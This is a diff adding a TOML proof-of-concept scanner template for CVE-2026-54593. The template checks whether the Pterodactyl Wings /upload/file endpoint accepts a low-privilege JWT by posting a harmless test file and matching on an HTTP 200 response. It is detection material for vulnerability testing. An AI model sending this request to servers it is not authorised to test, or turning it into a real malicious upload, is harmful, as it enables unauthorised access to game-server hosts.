@@ -1,0 +1,32 @@
+[info]
+author = "ave"
+description = "验证 Pterodactyl Wings /upload/file 接口是否接受低权限 JWT 令牌以实现非法文件上传"
+id = "POC-AVE-2026-0709"
+name = "CVE-2026-54593 PoC"
+severity = "high"
+tags = ["ave-2026-0709"]
+vuln_id = [
+    "CVE-2026-54593",
+    "AVE-2026-0709",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/upload/file"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"file": "test.txt", "content": "ave_test"}'
+type = "json"
+
+[poc.requests.headers]
+Authorization = "Bearer {{jwt_token}}"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
